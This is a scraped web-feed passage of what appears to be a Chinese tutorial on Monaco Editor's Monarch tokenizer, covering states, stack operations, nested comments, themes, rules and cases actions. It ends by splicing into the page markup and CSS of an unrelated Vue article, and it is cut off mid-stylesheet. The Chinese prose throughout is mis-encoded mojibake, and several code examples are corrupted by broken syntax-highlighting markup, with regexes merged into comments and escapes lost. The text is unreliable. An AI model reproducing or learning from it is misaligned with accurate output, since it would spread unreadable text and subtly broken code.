<p>ç®€å•çš„æ­£åˆ™æ— æ³•å¤„ç†è·¨è¶Šå¤šä¸ªå­—ç¬¦çš„ç»“æ„ï¼ˆå¦‚å¼•å·åŒ…å›´çš„å†…å®¹ï¼‰ã€‚æˆ‘ä»¬éœ€è¦å¼•å…¥ <strong>çŠ¶æ€ï¼ˆStatesï¼‰</strong> ã€‚</p>
<p>å¦‚ä¸‹ç¤ºä¾‹ï¼šè¯†åˆ«è¢«åŒå¼•å·åŒ…å›´çš„å­—ç¬¦ä¸²ï¼Œä¸”æ”¯æŒè½¬ä¹‰å­—ç¬¦ <code>"</code>ã€‚</p>
<pre><code class="hljs language-js" lang="js">monaco.<span class="hljs-property">languages</span>.<span class="hljs-title function_">setMonarchTokensProvider</span>(<span class="hljs-string">'myLang'</span>, {
  <span class="hljs-attr">tokenizer</span>: {
    <span class="hljs-attr">root</span>: [
      [<span class="hljs-regexp">/"/</span>, <span class="hljs-string">'string.quote'</span>, <span class="hljs-string">'@string'</span>], <span class="hljs-comment">// åŒ¹é…åˆ° " æ—¶ï¼Œæ ‡ä¸º string.quote å¹¶è¿›å…¥ string çŠ¶æ€</span>
    ],
    <span class="hljs-attr">string</span>: [
      [<span class="hljs-regexp">/\./</span>, <span class="hljs-string">'string.escape'</span>],  <span class="hljs-comment">// åŒ¹é…è½¬ä¹‰å­—ç¬¦ å¦‚ "</span>
      [<span class="hljs-regexp">/[^"]/</span>, <span class="hljs-string">'string'</span>],        <span class="hljs-comment">// åŒ¹é…é " å­—ç¬¦</span>
      [<span class="hljs-regexp">/"/</span>, <span class="hljs-string">'string.quote'</span>, <span class="hljs-string">'@pop'</span>]  <span class="hljs-comment">// / é‡åˆ°é—­åˆå¼•å·ï¼Œé€€å‡ºçŠ¶æ€å›åˆ° root</span>
    ]
  },
});
</code></pre>
<h3 data-id="heading-4">é«˜çº§ï¼šåµŒå¥—ä¸æ ˆæ“ä½œï¼ˆå¤šè¡Œæ³¨é‡Šä¸åµŒå¥—ç»“æ„ï¼‰</h3>
<p>è¯†åˆ«å¤šè¡Œæ³¨é‡Š <code>/* ... */</code>ï¼Œä¸”æ”¯æŒæ³¨é‡ŠåµŒå¥—å¦‚ <code>/* a /* b */ c */</code>ã€‚</p>
<pre><code class="hljs language-js" lang="js">monaco.<span class="hljs-property">languages</span>.<span class="hljs-title function_">setMonarchTokensProvider</span>(<span class="hljs-string">'myLang'</span>, {
  <span class="hljs-attr">tokenizer</span>: {
    <span class="hljs-attr">root</span>: [
        [<span class="hljs-comment">//*/, 'comment', '@comment'], // åŒ¹é…åˆ° /* è¿›å…¥æ³¨é‡ŠçŠ¶æ€</span>
    ],
    
    <span class="hljs-attr">comment</span>: [
        [<span class="hljs-regexp">/[^/*]+/</span>, <span class="hljs-string">'comment'</span>],
        [<span class="hljs-comment">//*/, 'comment', '@push'], // æ”¯æŒåµŒå¥—æ³¨é‡Š</span>
        [<span class="hljs-string">'\*/'</span>, <span class="hljs-string">'comment'</span>, <span class="hljs-string">'@pop'</span>],
        [<span class="hljs-regexp">/[/*]/</span>, <span class="hljs-string">'comment'</span>],
    ],
  },
});
</code></pre>
<h2 data-id="heading-5">ä¸»é¢˜</h2>
<p>å½“é…ç½®å¥½è¯æ³•åˆ†æåï¼Œä½¿ç”¨äº†é»˜è®¤çš„ token ï¼Œç¼–è¾‘å™¨ä¼šè‡ªåŠ¨è¿›è¡Œå¯¹åº”çš„è¯­è¨€é«˜äº®ã€‚</p>
<p>å½“è¯æ³•åˆ†æè§„åˆ™ä¸­é…ç½®äº†è‡ªå®šä¹‰çš„ tokenï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é…ç½®è‡ªå®šä¹‰ token çš„é¢œè‰²ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Define a new theme that contains only rules that match this language</span>
monaco.<span class="hljs-property">editor</span>.<span class="hljs-title function_">defineTheme</span>(<span class="hljs-string">"myCoolTheme"</span>, {
    <span class="hljs-attr">base</span>: <span class="hljs-string">"vs"</span>,
    <span class="hljs-attr">inherit</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">rules</span>: [
        { <span class="hljs-attr">token</span>: <span class="hljs-string">"custom-info"</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">"808080"</span> },
        { <span class="hljs-attr">token</span>: <span class="hljs-string">"custom-error"</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">"ff0000"</span>, <span class="hljs-attr">fontStyle</span>: <span class="hljs-string">"bold"</span> },
        { <span class="hljs-attr">token</span>: <span class="hljs-string">"custom-notice"</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">"FFA500"</span> },
        { <span class="hljs-attr">token</span>: <span class="hljs-string">"custom-date"</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">"008800"</span> },
    ],
    <span class="hljs-attr">colors</span>: {
        <span class="hljs-string">"editor.foreground"</span>: <span class="hljs-string">"#000000"</span>,
    },
});
</code></pre>
<h2 data-id="heading-6">Tokenizer å®šä¹‰è¯¦è§£</h2>
<blockquote>
<p>æ›´å¤šå†…å®¹å‚è€ƒï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmicrosoft.github.io%2Fmonaco-editor%2Fmonarch.html" target="_blank" title="https://microsoft.github.io/monaco-editor/monarch.html" ref="nofollow noopener noreferrer">microsoft.github.io/monaco-editâ€¦</a></p>
</blockquote>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä¼ªä»£ç ç¤ºæ„</span>
<span class="hljs-comment">// tokenizer çš„å®šä¹‰</span>
<span class="hljs-attr">tokenizer</span>: {
   <span class="hljs-comment">// åŒ…å«è‹¥å¹²çŠ¶æ€(state)</span>
   <span class="hljs-comment">// xxxx çŠ¶æ€(state)</span>
   <span class="hljs-attr">xxxx</span>: [
      <span class="hljs-comment">// xxxx çŠ¶æ€ä¸‹åŒ…å«è‹¥å¹²è§„åˆ™(rule)ï¼Œ</span>
      [regex,  action],  <span class="hljs-comment">// è§„åˆ™ç”± æ­£åˆ™è¡¨è¾¾å¼(regex) ä¸åŠ¨ä½œ(action) ç»„æˆ</span>
   ]
}
</code></pre>
<h3 data-id="heading-7">çŠ¶æ€</h3>
<p>åˆ†è¯å™¨ï¼ˆtokenizerï¼‰ç”±ä¸€ä¸ªå®šä¹‰çŠ¶æ€çš„å¯¹è±¡æ„æˆã€‚åˆ†è¯å™¨çš„åˆå§‹çŠ¶æ€æ˜¯å…¶å®šä¹‰ä¸­çš„ç¬¬ä¸€ä¸ªçŠ¶æ€ã€‚å½“åˆ†è¯å™¨å¤„äºæŸä¸ªç‰¹å®šçŠ¶æ€æ—¶ï¼Œåªä¼šåº”ç”¨è¯¥çŠ¶æ€ä¸‹çš„è§„åˆ™ã€‚æ‰€æœ‰è§„åˆ™æŒ‰é¡ºåºè¿›è¡ŒåŒ¹é…ï¼Œå½“ç¬¬ä¸€ä¸ªè§„åˆ™åŒ¹é…æˆåŠŸåï¼Œå°±ä¼šæ‰§è¡Œå…¶å¯¹åº”çš„æ“ä½œæ¥ç¡®å®šè¯æ³•å•å…ƒç±»åˆ«ï¼Œåç»­è§„åˆ™ä¸å†è¿›è¡Œå°è¯•ã€‚å› æ­¤ï¼Œä»¥æœ€é«˜æ•ˆçš„æ–¹å¼å¯¹è§„åˆ™è¿›è¡Œæ’åºå¯èƒ½å¾ˆé‡è¦ï¼Œä¾‹å¦‚ï¼Œå°†ç©ºç™½ç¬¦å’Œæ ‡è¯†ç¬¦è§„åˆ™æ”¾åœ¨å‰é¢ã€‚</p>
<h3 data-id="heading-8">è§„åˆ™</h3>
<p>æ¯ä¸ªçŠ¶æ€éƒ½è¢«å®šä¹‰ä¸ºä¸€ç»„è§„åˆ™æ•°ç»„ï¼Œè¿™äº›è§„åˆ™ç”¨äºåŒ¹é…è¾“å…¥ã€‚è§„åˆ™å¯ä»¥é‡‡ç”¨ä»¥ä¸‹å½¢å¼ï¼š</p>
<p><strong><code>[</code></strong> <em><strong><code>regex</code></strong></em> <strong><code>,</code></strong> <em><strong><code>action</code></strong></em> <strong><code>]</code></strong></p>
<p><code>{ regex: </code><em><code>regex</code></em><code>, action: </code><em><code>action</code></em><code> }</code> çš„ç®€å†™</p>
<p><strong><code>[</code></strong> <em><strong><code>regex</code></strong></em> <strong><code>,</code></strong> <em><strong><code>action</code></strong></em> <strong><code>,</code></strong> <em><strong><code>next</code></strong></em> <strong><code>]</code></strong></p>
<p><code>{ regex: </code><em><code>regex</code></em><code>, action: </code><em><code>action</code></em><code>{next: </code><em><code>next</code></em><code>} }</code> çš„ç®€å†™</p>
<p><strong><code>{regex:</code></strong> <em><strong><code>regex</code></strong></em> <strong><code>, action:</code></strong> <em><strong><code>action</code></strong></em> <strong><code>}</code></strong></p>
<p>Â Â å½“æ­£åˆ™è¡¨è¾¾å¼ä¸å½“å‰è¾“å…¥åŒ¹é…æ—¶ï¼Œå°±ä¼šæ‰§è¡Œç›¸åº”æ“ä½œæ¥è®¾ç½®è¯æ³•å•å…ƒçš„ç±»åˆ«ã€‚æ­£åˆ™è¡¨è¾¾å¼ï¼ˆregexï¼‰æ—¢å¯ä»¥æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼ˆä½¿ç”¨/regex/çš„å½¢å¼ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªè¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²ã€‚ç¤ºä¾‹å¦‚ä¸Šè¿°ã€ŒåŸºç¡€åŒ¹é…ã€å†…å®¹ã€‚</p>
<p><strong><code>{ include:</code></strong> <em><strong><code>state</code></strong></em> <strong><code>}</code></strong></p>
<p>Â Â ç”¨äºå¯¹è§„åˆ™è¿›è¡Œè‰¯å¥½çš„ç»„ç»‡ï¼Œå¹¶æ‰©å±•ä¸ºåœ¨çŠ¶æ€ä¸­å®šä¹‰çš„æ‰€æœ‰è§„åˆ™ã€‚è¿™æ˜¯é¢„å…ˆæ‰©å±•çš„ï¼Œå¯¹æ€§èƒ½æ²¡æœ‰å½±å“ã€‚å¦‚ä¸‹ç¤ºä¾‹ï¼ŒåŒ…å«çš„ <code>@whitespace</code> çŠ¶æ€ã€‚</p>
<pre><code class="hljs language-js" lang="js">    <span class="hljs-attr">tokenizer</span>: {
    <span class="hljs-attr">root</span>: [
      <span class="hljs-comment">// ... others</span>
      <span class="hljs-comment">// whitespace</span>
      { <span class="hljs-attr">include</span>: <span class="hljs-string">'@whitespace'</span> },
    ],

    <span class="hljs-attr">comment</span>: [
      [<span class="hljs-regexp">/[^/*]+/</span>, <span class="hljs-string">'comment'</span> ],
      [<span class="hljs-comment">//*/,    'comment', '@push' ],    // nested comment</span>
      [<span class="hljs-string">"\*/"</span>,    <span class="hljs-string">'comment'</span>, <span class="hljs-string">'@pop'</span>  ],
      [<span class="hljs-regexp">/[/*]/</span>,   <span class="hljs-string">'comment'</span> ]
    ],

    <span class="hljs-attr">whitespace</span>: [
      [<span class="hljs-regexp">/[ \t\r\n]+/</span>, <span class="hljs-string">'white'</span>],
      [<span class="hljs-comment">//*/,       'comment', '@comment' ],</span>
      [<span class="hljs-comment">///.*$/,    'comment'],</span>
    ],
  },
</code></pre>
<h3 data-id="heading-9">åŠ¨ä½œ</h3>
<p>ä¸€ä¸ªåŠ¨ä½œå†³å®šäº†ç”Ÿæˆçš„è¯æ³•å•å…ƒï¼ˆtokenï¼‰ç±»åˆ«ã€‚ä¸€ä¸ªåŠ¨ä½œå¯ä»¥æœ‰ä»¥ä¸‹å½¢å¼ï¼š</p>
<ul>
<li><em><strong><code>string</code></strong></em></li>
</ul>
<p>æ˜¯ <code>{ token: </code><em><code>string</code></em><code> }</code> çš„ç®€å†™ã€‚</p>
<ul>
<li>
<p><strong><code>[</code></strong> <em><strong><code>action1</code></strong></em> <strong><code>,...,</code></strong> <em><strong><code>actionN</code></strong></em> <strong><code>]</code></strong></p>
<ul>
<li>
<p>Â Â ä¸€ä¸ªåŒ…å« N ä¸ªåŠ¨ä½œçš„æ•°ç»„ã€‚è¿™ä»…åœ¨æ­£åˆ™è¡¨è¾¾å¼æ°å¥½ç”± N ä¸ªç»„ï¼ˆå³å¸¦æ‹¬å·çš„éƒ¨åˆ†ï¼‰ç»„æˆæ—¶æ‰è¢«å…è®¸ã€‚ç”±äºåˆ†è¯å™¨çš„å·¥ä½œæ–¹å¼ï¼Œä½ å¿…é¡»ä»¥è¿™æ ·ä¸€ç§æ–¹å¼å®šä¹‰è¿™äº›ç»„ï¼šæ‰€æœ‰ç»„éƒ½å‡ºç°åœ¨é¡¶çº§ä½ç½®å¹¶æ¶µç›–æ•´ä¸ªè¾“å…¥ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†å¸¦æœ‰ASCIIç è½¬ä¹‰åºåˆ—çš„å­—ç¬¦å®šä¹‰ä¸ºï¼š</p>
</li>
<li>
<pre><code class="hljs language-js" lang="js">/(<span class="hljs-string">')(\(?:[abnfrt]|[xX][0-9]{2}))('</span>)/, [<span class="hljs-string">'string'</span>,<span class="hljs-string">'string.escape'</span>,<span class="hljs-string">'string'</span>]]
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong><code>{ token:</code></strong> <em><strong><code>tokenclass</code></strong></em> <strong><code>}</code></strong></p>
<ul>
<li>
<p>Â Â ä¸€ä¸ªå®šä¹‰ç”¨äº CSS æ¸²æŸ“çš„è¯æ³•å•å…ƒï¼ˆtokenï¼‰ç±»åˆ«çš„å¯¹è±¡ã€‚å¸¸è§çš„è¯æ³•å•å…ƒï¼ˆtokenï¼‰ä¾‹å¦‚æœ‰â€œkeywordâ€ï¼ˆå…³é”®å­—ï¼‰ã€â€œcommentâ€ï¼ˆæ³¨é‡Šï¼‰æˆ–â€œidentifierâ€ï¼ˆæ ‡è¯†ç¬¦ï¼‰ã€‚ä½ å¯ä»¥ä½¿ç”¨ç‚¹æ¥è¡¨ç¤ºå±‚çº§åŒ–çš„CSSåç§°ï¼Œæ¯”å¦‚â€œtype.identifierâ€æˆ–â€œstring.escapeâ€ã€‚</p>
</li>
</ul>
</li>
</ul>
<p>ä¸€ä¸ªåŠ¨ä½œå¯¹è±¡å¯ä»¥åŒ…å«æ›´å¤šå½±å“è¯æ³•åˆ†æå™¨çŠ¶æ€çš„å­—æ®µã€‚ä»¥ä¸‹å±æ€§æ˜¯å¯è¯†åˆ«çš„ï¼š</p>
<ul>
<li><strong><code>next:</code></strong> <em><strong><code>state</code></strong></em></li>
</ul>
<p>Â Â ï¼ˆå­—ç¬¦ä¸²ï¼‰å¦‚æœå·²å®šä¹‰ï¼Œå®ƒä¼šå°†å½“å‰çŠ¶æ€æ¨å…¥åˆ†è¯å™¨æ ˆï¼Œå¹¶ä½¿ state æˆä¸ºå½“å‰çŠ¶æ€ã€‚ä¾‹å¦‚ï¼Œè¿™å¯ç”¨äºå¼€å§‹å¯¹å—æ³¨é‡Šè¿›è¡Œåˆ†è¯ï¼š</p>
<pre><code class="hljs language-js" lang="js">[<span class="hljs-string">'/\*'</span>, <span class="hljs-string">'comment'</span>, <span class="hljs-string">'@comment'</span> ]
</code></pre>
<blockquote>
<p>è¯·æ³¨æ„ï¼Œè¿™æ˜¯ä»¥ä¸‹å†…å®¹çš„ç®€å†™å½¢å¼</p>
<p><code>{ regex: '/\*', action: { token: 'comment', next: '@comment' } }</code></p>
</blockquote>
<p>Â Â åœ¨è¿™é‡Œï¼ŒåŒ¹é…åˆ°çš„ <code>/*</code> è¢«èµ‹äºˆâ€œcommentâ€è¯æ³•å•å…ƒï¼Œåˆ†è¯å™¨ä¼šä½¿ç”¨ <code>@comment</code> çŠ¶æ€ä¸‹çš„è§„åˆ™ç»§ç»­åŒ¹é…è¾“å…¥ã€‚</p>
<p>Â Â nextå±æ€§å¯ä»¥ä½¿ç”¨ä¸€äº›ç‰¹æ®ŠçŠ¶æ€ï¼š</p>
<ul>
<li><code>"@pop"</code></li>
</ul>
<p>Â Â Â Â å¼¹å‡ºåˆ†è¯å™¨æ ˆä»¥è¿”å›åˆ°ä¹‹å‰çš„çŠ¶æ€ã€‚ä¾‹å¦‚ï¼Œè¿™å¯ç”¨äºåœ¨çœ‹åˆ°ç»“æŸæ ‡è®°åä»å—æ³¨é‡Šåˆ†è¯çŠ¶æ€è¿”å›ï¼š</p>
<pre><code class="hljs language-js" lang="js">[<span class="hljs-string">'\*/'</span>, <span class="hljs-string">'comment'</span>, <span class="hljs-string">'@pop'</span>]
</code></pre>
<ul>
<li><code>"@push"</code></li>
</ul>
<p>Â Â Â Â æ¨å…¥å½“å‰çŠ¶æ€å¹¶ç»§ç»­ä¿æŒå½“å‰çŠ¶æ€ã€‚åœ¨çœ‹åˆ°æ³¨é‡Šå¼€å§‹æ ‡è®°æ—¶å¤„ç†åµŒå¥—å—æ³¨é‡Šå¾ˆæœ‰ç”¨ï¼Œä¾‹å¦‚ï¼Œåœ¨@commentçŠ¶æ€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·åšï¼š</p>
<pre><code class="hljs language-js" lang="js">[<span class="hljs-string">'/\*'</span>, <span class="hljs-string">'comment'</span>, <span class="hljs-string">'@push'</span>]
</code></pre>
<ul>
<li><code>"@popall"</code></li>
</ul>
<p>Â Â Â Â å¼¹å‡ºåˆ†è¯å™¨æ ˆä¸­çš„æ‰€æœ‰å†…å®¹å¹¶è¿”å›åˆ°é¡¶å±‚çŠ¶æ€ã€‚è¿™å¯ç”¨äºåœ¨æ¢å¤è¿‡ç¨‹ä¸­ä»æ·±å±‚åµŒå¥—çº§åˆ«â€œè·³è½¬â€å›åˆå§‹çŠ¶æ€ã€‚</p>
<ul>
<li>
<p><strong><code>{ cases: { guard1: action1, ..., guardN: actionN } }</code></strong></p>
<ul>
<li>Â Â æœ€åä¸€ç§åŠ¨ä½œå¯¹è±¡æ˜¯ cases è¯­å¥ã€‚cases å¯¹è±¡åŒ…å«ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­æ¯ä¸ªå­—æ®µéƒ½å……å½“ä¸€ä¸ªå®ˆå«æ¡ä»¶ã€‚æ¯ä¸ªå®ˆå«æ¡ä»¶éƒ½ä¼šåº”ç”¨äºåŒ¹é…åˆ°çš„è¾“å…¥ï¼Œä¸€æ—¦å…¶ä¸­ä¸€ä¸ªå®ˆå«æ¡ä»¶åŒ¹é…æˆåŠŸï¼Œå°±ä¼šæ‰§è¡Œç›¸åº”çš„åŠ¨ä½œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºè¿™äº›æœ¬èº«å°±æ˜¯åŠ¨ä½œï¼Œæ‰€ä»¥ cases å¯ä»¥åµŒå¥—ã€‚ä½¿ç”¨ cases æ˜¯ä¸ºäº†æé«˜æ•ˆç‡ï¼šä¾‹å¦‚ï¼Œæˆ‘ä»¬å…ˆåŒ¹é…æ ‡è¯†ç¬¦ï¼Œç„¶åæ£€æŸ¥è¯¥æ ‡è¯†ç¬¦æ˜¯å¦å¯èƒ½æ˜¯å…³é”®å­—æˆ–å†…ç½®å‡½æ•°ï¼š</li>
<li>
<pre><code class="hljs language-js" lang="js">[<span class="hljs-regexp">/[a-z_$][a-zA-Z0-9_$]*/</span>,
  { <span class="hljs-attr">cases</span>: {
      <span class="hljs-string">'@typeKeywords'</span>: <span class="hljs-string">'keyword.type'</span>,
      <span class="hljs-string">'@keywords'</span>: <span class="hljs-string">'keyword'</span>,
      <span class="hljs-string">'@default'</span>: <span class="hljs-string">'identifier'</span>
   } }
]
</code></pre>
</li>
</ul>
</li>
</ul>
<p>Â Â å®ˆå«æ¡ä»¶å¯ä»¥åŒ…æ‹¬ï¼š</p>
<p>Â Â <code>"@keywords"</code></p>
<p>Â Â Â Â keywords å±æ€§å¿…é¡»åœ¨è¯­è¨€å¯¹è±¡ä¸­å®šä¹‰ï¼Œå¹¶ä¸”ç”±å­—ç¬¦ä¸²æ•°ç»„ç»„æˆã€‚å¦‚æœåŒ¹é…åˆ°çš„è¾“å…¥ä¸è¯¥æ•°ç»„ä¸­çš„ä»»ä½•ä¸€ä¸ªå­—ç¬¦ä¸²åŒ¹é…ï¼Œé‚£ä¹ˆè¿™ä¸ªå®ˆå«æ¡ä»¶å°±ä¼šæˆåŠŸã€‚ï¼ˆæ³¨æ„ï¼šæ‰€æœ‰æƒ…å†µéƒ½ä¼šé¢„å…ˆç¼–è¯‘ï¼Œå¹¶ä¸”ä¼šä½¿ç”¨é«˜æ•ˆçš„å“ˆå¸Œæ˜ å°„æ¥æµ‹è¯•è¯¥åˆ—è¡¨ï¼‰ã€‚é«˜çº§ç”¨æ³•ï¼šå¦‚æœè¯¥å±æ€§æŒ‡å‘å•ä¸ªå­—ç¬¦ä¸²ï¼ˆè€Œéæ•°ç»„ï¼‰ï¼Œå®ƒä¼šè¢«ç¼–è¯‘æˆä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºæµ‹è¯•åŒ¹é…åˆ°çš„è¾“å…¥ã€‚</p>
<p>Â Â <code>"@default"</code></p>
<p>Â Â Â Â ï¼ˆæˆ–"@"æˆ–""ï¼‰é»˜è®¤çš„å®ˆå«æ¡ä»¶ï¼Œå§‹ç»ˆä¼šæˆåŠŸã€‚</p>
<p>Â Â <code>"@eos"</code></p>
<p>Â Â Â Â å¦‚æœåŒ¹é…åˆ°çš„è¾“å…¥å·²åˆ°è¾¾è¡Œå°¾ï¼Œåˆ™æˆåŠŸã€‚</p>
<p>Â Â <code>"regex"</code></p>
<p>Â Â Â Â å¦‚æœå®ˆå«æ¡ä»¶ä¸æ˜¯ä»¥@ï¼ˆæˆ–$ï¼‰å­—ç¬¦å¼€å¤´ï¼Œåˆ™ä¼šè¢«è§£é‡Šä¸ºä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºæµ‹è¯•åŒ¹é…åˆ°çš„è¾“å…¥ã€‚æ³¨æ„ï¼šè¯¥æ­£åˆ™è¡¨è¾¾å¼ä¼šè¢«åŠ ä¸Šå‰ç¼€^å’Œåç¼€$ï¼Œå› æ­¤å®ƒå¿…é¡»ä¸åŒ¹é…åˆ°çš„è¾“å…¥å®Œå…¨åŒ¹é…ã€‚è¿™å¯ç”¨äºæµ‹è¯•ç‰¹å®šçš„è¾“å…¥ï¼Œä¾‹å¦‚ï¼Œä¸‹é¢æ˜¯æ¥è‡ªKokaè¯­è¨€çš„ä¸€ä¸ªç¤ºä¾‹ï¼Œå®ƒä½¿ç”¨è¿™ä¸€ç‰¹æ€§æ ¹æ®å£°æ˜è¿›å…¥ä¸åŒçš„åˆ†è¯å™¨çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-js" lang="js">[<span class="hljs-regexp">/[a-z](\w|-[a-zA-Z])*/</span>,
  { <span class="hljs-attr">cases</span>:{ <span class="hljs-string">'@keywords'</span>: {
               <span class="hljs-attr">cases</span>: { <span class="hljs-string">'alias'</span>              : { <span class="hljs-attr">token</span>: <span class="hljs-string">'keyword'</span>, <span class="hljs-attr">next</span>: <span class="hljs-string">'@alias-type'</span> }
                      , <span class="hljs-string">'struct'</span>             : { <span class="hljs-attr">token</span>: <span class="hljs-string">'keyword'</span>, <span class="hljs-attr">next</span>: <span class="hljs-string">'@struct-type'</span> }
                      , <span class="hljs-string">'type|cotype|rectype'</span>: { <span class="hljs-attr">token</span>: <span class="hljs-string">'keyword'</span>, <span class="hljs-attr">next</span>: <span class="hljs-string">'@type'</span> }
                      , <span class="hljs-string">'module|as|import'</span>   : { <span class="hljs-attr">token</span>: <span class="hljs-string">'keyword'</span>, <span class="hljs-attr">next</span>: <span class="hljs-string">'@module'</span> }
                      , <span class="hljs-string">'@default'</span>           : <span class="hljs-string">'keyword'</span> }
            }
          , <span class="hljs-string">'@builtins'</span>: <span class="hljs-string">'predefined'</span>
          , <span class="hljs-string">'@default'</span> : <span class="hljs-string">'identifier'</span> }
  }
]
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vueå˜åŒ–å“åº”]]></title>    <link>https://juejin.cn/post/7592531796039794722</link>    <guid>https://juejin.cn/post/7592531796039794722</guid>    <pubDate>2026-01-07T13:45:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592531796039794722" data-draft-id="7592276645361991680" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vueå˜åŒ–å“åº”"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-07T13:45:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€æ ‘å±±èŒ¶"/> <meta itemprop="url" content="https://juejin.cn/user/3200024337714491"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vueå˜åŒ–å“åº”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3200024337714491/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€æ ‘å±±èŒ¶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T13:45:59.000Z" title="Wed Jan 07 2026 13:45:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid 